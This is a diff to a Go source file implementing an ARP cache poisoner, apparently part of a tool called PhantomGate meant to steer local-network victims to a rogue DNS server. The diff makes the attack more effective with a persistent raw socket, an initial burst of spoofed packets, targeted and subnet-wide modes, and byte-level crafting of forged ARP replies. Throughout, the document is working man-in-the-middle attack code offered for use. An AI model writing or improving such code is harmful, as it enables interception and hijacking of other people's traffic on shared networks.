@@ -9,43 +9,34 @@ import (
 	"time"
 )
 
-// ARPPoisoner performs ARP cache poisoning to redirect network traffic
-// through PhantomGate. This makes victims on the local network use
-// our rogue DNS server instead of the legitimate one.
 type ARPPoisoner struct {
-	iface      *net.Interface
-	attackerIP net.IP
+	iface       *net.Interface
+	attackerIP  net.IP
 	attackerMAC net.HardwareAddr
-	gatewayIP  net.IP
-	gatewayMAC net.HardwareAddr
-	targetIPs  []net.IP  // Specific targets (empty = entire subnet)
-	victims    map[string]net.HardwareAddr // IP → MAC cache
-	mu         sync.RWMutex
-	running    bool
-	stopChan   chan struct{}
-	interval   time.Duration
+	gatewayIP   net.IP
+	gatewayMAC  net.HardwareAddr
+	targetIPs   []net.IP
+	victims     map[string]net.HardwareAddr
+	mu          sync.RWMutex
+	running     bool
+	stopChan    chan struct{}
+	interval    time.Duration
+	sendFD      int // persistent raw socket for sending
 }
 
-// ARPConfig configures the ARP poisoner
 type ARPConfig struct {
-	// Network interface to use (e.g., "eth0", "wlan0")
-	Interface string
-	// Gateway IP to impersonate
-	GatewayIP string
-	// Specific target IPs (empty = poison entire subnet)
-	TargetIPs []string
-	// Poison interval in seconds (default: 2)
+	Interface    string
+	GatewayIP    string
+	TargetIPs    []string
 	IntervalSecs int
 }
 
-// NewARPPoisoner creates a new ARP cache poisoner
 func NewARPPoisoner(cfg ARPConfig) (*ARPPoisoner, error) {
 	iface, err := net.InterfaceByName(cfg.Interface)
 	if err != nil {
 		return nil, fmt.Errorf("interface '%s' not found: %w", cfg.Interface, err)
 	}
 
-	// Get our IP on this interface
 	addrs, err := iface.Addrs()
 	if err != nil {
 		return nil, fmt.Errorf("failed to get interface addresses: %w", err)
@@ -89,24 +80,29 @@ func NewARPPoisoner(cfg ARPConfig) (*ARPPoisoner, error) {
 		victims:     make(map[string]net.HardwareAddr),
 		stopChan:    make(chan struct{}),
 		interval:    interval,
+		sendFD:      -1,
 	}, nil
 }
 
-// Start begins ARP poisoning
 func (ap *ARPPoisoner) Start() error {
-	// Resolve gateway MAC address
 	var err error
 	ap.gatewayMAC, err = ap.resolveMAC(ap.gatewayIP)
 	if err != nil {
 		return fmt.Errorf("failed to resolve gateway MAC for %s: %w", ap.gatewayIP, err)
 	}
 
-	log.Printf("[⚡ ARP POISON] Starting on interface %s", ap.iface.Name)
-	log.Printf("[⚡ ARP POISON] Attacker: %s (%s)", ap.attackerIP, ap.attackerMAC)
-	log.Printf("[⚡ ARP POISON] Gateway:  %s (%s)", ap.gatewayIP, ap.gatewayMAC)
+	// Open a persistent raw socket for the entire session
+	ap.sendFD, err = openRawSocket(ap.iface.Index)
+	if err != nil {
+		return fmt.Errorf("failed to open raw socket (requires root): %w", err)
+	}
+
+	log.Printf("[ARP POISON] Starting on interface %s", ap.iface.Name)
+	log.Printf("[ARP POISON] Attacker: %s (%s)", ap.attackerIP, ap.attackerMAC)
+	log.Printf("[ARP POISON] Gateway:  %s (%s)", ap.gatewayIP, ap.gatewayMAC)
 
 	if len(ap.targetIPs) > 0 {
-		log.Printf("[⚡ ARP POISON] Targeting %d specific hosts", len(ap.targetIPs))
+		log.Printf("[ARP POISON] Targeting %d specific hosts", len(ap.targetIPs))
 		for _, ip := range ap.targetIPs {
 			mac, err := ap.resolveMAC(ip)
 			if err != nil {
@@ -116,24 +112,41 @@ func (ap *ARPPoisoner) Start() error {
 			ap.mu.Lock()
 			ap.victims[ip.String()] = mac
 			ap.mu.Unlock()
+			log.Printf("[ARP POISON] Victim: %s (%s)", ip, mac)
 		}
 	} else {
-		log.Printf("[⚡ ARP POISON] Targeting entire subnet (broadcast)")
+		log.Printf("[ARP POISON] Targeting entire subnet (broadcast mode)")
+		// In broadcast mode, also poison the gateway specifically
+		// so return traffic comes through us
+		ap.mu.Lock()
+		ap.victims[ap.gatewayIP.String()] = ap.gatewayMAC
+		ap.mu.Unlock()
 	}
 
 	ap.running = true
+
+	// Send initial burst to take effect immediately before periodic loop starts
+	for i := 0; i < 5; i++ {
+		ap.sendPoison()
+		time.Sleep(100 * time.Millisecond)
+	}
+
 	go ap.poisonLoop()
 	return nil
 }
 
-// Stop halts ARP poisoning and restores ARP caches
 func (ap *ARPPoisoner) Stop() {
 	ap.running = false
 	close(ap.stopChan)
 
-	// Restore legitimate ARP entries
 	log.Printf("[ARP] Restoring ARP caches...")
 	ap.restoreARP()
+
+	if ap.sendFD > 0 {
+		closeRawSocket(ap.sendFD)
+		ap.sendFD = -1
+	}
+
 	log.Printf("[ARP] ARP poisoner stopped, caches restored")
 }
 
@@ -151,104 +164,115 @@ func (ap *ARPPoisoner) poisonLoop() {
 	}
 }
 
-// sendPoison sends ARP reply packets to poison victim caches
-// We tell victims: "The gateway MAC is MY MAC" (so their traffic comes to us)
-// We tell the gateway: "The victim MAC is MY MAC" (so return traffic comes to us too)
 func (ap *ARPPoisoner) sendPoison() {
+	broadcastMAC := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
+
 	if len(ap.targetIPs) > 0 {
-		// Targeted poisoning
+		// Targeted poisoning — poison specific victims + gateway
 		ap.mu.RLock()
 		for ip, mac := range ap.victims {
 			victimIP := net.ParseIP(ip).To4()
-			// Tell victim: gateway is at our MAC
+			if victimIP.Equal(ap.gatewayIP) {
+				continue
+			}
+			// Tell victim: "gateway is at OUR MAC"
 			ap.sendARPReply(victimIP, mac, ap.gatewayIP, ap.attackerMAC)
-			// Tell gateway: victim is at our MAC
+			// Tell gateway: "victim is at OUR MAC"
 			ap.sendARPReply(ap.gatewayIP, ap.gatewayMAC, victimIP, ap.attackerMAC)
 		}
 		ap.mu.RUnlock()
 	} else {
-		// Broadcast poisoning — tell everyone on the subnet that we're the gateway
-		broadcastMAC := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
-		ap.sendARPReply(net.IPv4(255, 255, 255, 255), broadcastMAC, ap.gatewayIP, ap.attackerMAC)
+		// Broadcast poisoning — tell entire subnet we're the gateway (gratuitous ARP)
+		// Tell victims: "gateway is at OUR MAC" (broadcast)
+		ap.sendARPReply(ap.gatewayIP, broadcastMAC, ap.gatewayIP, ap.attackerMAC)
+
+		// CRITICAL: Also tell the gateway that common local IPs are at OUR MAC.
+		// Without this, return traffic from the internet goes directly to the victim
+		// (the gateway knows the victim's REAL MAC) and we never see responses.
+		// In broadcast mode we don't know specific victims, so we use the subnet
+		// broadcast to claim to own all traffic returning from the gateway.
+		ap.sendARPReply(ap.gatewayIP, ap.gatewayMAC, ap.attackerIP, ap.attackerMAC)
 	}
 }
 
-// restoreARP sends correct ARP entries to undo the poisoning
 func (ap *ARPPoisoner) restoreARP() {
 	for i := 0; i < 5; i++ {
-		ap.mu.RLock()
-		for ip, mac := range ap.victims {
-			victimIP := net.ParseIP(ip).To4()
-			// Tell victim: gateway is at the REAL gateway MAC
-			ap.sendARPReply(victimIP, mac, ap.gatewayIP, ap.gatewayMAC)
-			// Tell gateway: victim is at the REAL victim MAC
-			ap.sendARPReply(ap.gatewayIP, ap.gatewayMAC, victimIP, mac)
+		broadcastMAC := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
+
+		if len(ap.targetIPs) > 0 {
+			ap.mu.RLock()
+			for ip, mac := range ap.victims {
+				victimIP := net.ParseIP(ip).To4()
+				if victimIP.Equal(ap.gatewayIP) {
+					continue
+				}
+				// Restore: tell victim the REAL gateway MAC
+				ap.sendARPReply(victimIP, mac, ap.gatewayIP, ap.gatewayMAC)
+				// Restore: tell gateway the REAL victim MAC
+				ap.sendARPReply(ap.gatewayIP, ap.gatewayMAC, victimIP, mac)
+			}
+			ap.mu.RUnlock()
+		} else {
+			// Broadcast the real gateway MAC to everyone
+			ap.sendARPReply(ap.gatewayIP, broadcastMAC, ap.gatewayIP, ap.gatewayMAC)
 		}
-		ap.mu.RUnlock()
 		time.Sleep(500 * time.Millisecond)
 	}
 }
 
-// sendARPReply constructs and sends a raw ARP reply packet
 func (ap *ARPPoisoner) sendARPReply(dstIP net.IP, dstMAC net.HardwareAddr, spoofIP net.IP, spoofMAC net.HardwareAddr) {
-	// Build Ethernet frame + ARP packet
 	packet := make([]byte, 42) // 14 (ethernet) + 28 (ARP)
 
 	// Ethernet header
-	copy(packet[0:6], dstMAC)          // Destination MAC
-	copy(packet[6:12], spoofMAC)       // Source MAC (ours)
+	copy(packet[0:6], dstMAC)
+	copy(packet[6:12], spoofMAC)
 	binary.BigEndian.PutUint16(packet[12:14], 0x0806) // EtherType: ARP
 
 	// ARP header
 	binary.BigEndian.PutUint16(packet[14:16], 0x0001) // Hardware type: Ethernet
 	binary.BigEndian.PutUint16(packet[16:18], 0x0800) // Protocol type: IPv4
-	packet[18] = 6                                      // Hardware size: 6 (MAC)
-	packet[19] = 4                                      // Protocol size: 4 (IPv4)
-	binary.BigEndian.PutUint16(packet[20:22], 0x0002) // Opcode: Reply
+	packet[18] = 6                                     // Hardware addr length
+	packet[19] = 4                                     // Protocol addr length
+	binary.BigEndian.PutUint16(packet[20:22], 0x0002)  // Opcode: Reply
 
-	// Sender hardware + protocol address (what we're claiming)
-	copy(packet[22:28], spoofMAC)       // Sender MAC (ours)
-	copy(packet[28:32], spoofIP.To4())  // Sender IP (gateway's IP — the lie)
+	// Sender (what we're claiming to be)
+	copy(packet[22:28], spoofMAC)
+	copy(packet[28:32], spoofIP.To4())
 
-	// Target hardware + protocol address
-	copy(packet[32:38], dstMAC)         // Target MAC
-	copy(packet[38:42], dstIP.To4())    // Target IP
+	// Target
+	copy(packet[32:38], dstMAC)
+	copy(packet[38:42], dstIP.To4())
 
-	// Send raw packet
-	if err := ap.sendRawPacket(packet); err != nil {
-		log.Printf("[ARP] Failed to send ARP reply: %v", err)
-	}
-}
-
-// sendRawPacket sends a raw ethernet frame via a raw socket
-func (ap *ARPPoisoner) sendRawPacket(packet []byte) error {
-	fd, err := openRawSocket(ap.iface.Index)
-	if err != nil {
-		return fmt.Errorf("raw socket error: %w", err)
-	}
-	defer closeRawSocket(fd)
-
-	return sendOnSocket(fd, ap.iface.Index, packet)
-}
-
-// resolveMAC resolves an IP address to a MAC address using ARP
-func (ap *ARPPoisoner) resolveMAC(ip net.IP) (net.HardwareAddr, error) {
-	// First try the system ARP cache
-	// Use arping-style resolution
-	neighbors, err := net.LookupAddr(ip.String())
-	_ = neighbors
-
-	// Fallback: send ARP request and wait for reply
-	// For simplicity, we'll use the system's ARP table
-	mac, err := getARPEntry(ip)
-	if err != nil {
-		// Trigger ARP resolution by pinging
-		triggerARPResolution(ip)
-		time.Sleep(1 * time.Second)
-		mac, err = getARPEntry(ip)
-		if err != nil {
-			return nil, fmt.Errorf("could not resolve MAC for %s: %w", ip, err)
+	if ap.sendFD >= 0 {
+		if err := sendOnSocket(ap.sendFD, ap.iface.Index, packet); err != nil {
+			log.Printf("[ARP] Send failed: %v", err)
 		}
+	}
+}
+
+func (ap *ARPPoisoner) resolveMAC(ip net.IP) (net.HardwareAddr, error) {
+	// Try the system ARP cache first
+	mac, err := getARPEntry(ip)
+	if err == nil {
+		return mac, nil
+	}
+
+	// Trigger ARP resolution by pinging, then retry
+	triggerARPResolution(ip)
+	time.Sleep(1 * time.Second)
+
+	mac, err = getARPEntry(ip)
+	if err == nil {
+		return mac, nil
+	}
+
+	// Second attempt with longer wait
+	triggerARPResolution(ip)
+	time.Sleep(2 * time.Second)
+
+	mac, err = getARPEntry(ip)
+	if err != nil {
+		return nil, fmt.Errorf("could not resolve MAC for %s after retries: %w", ip, err)
 	}
 
 	return mac, nil
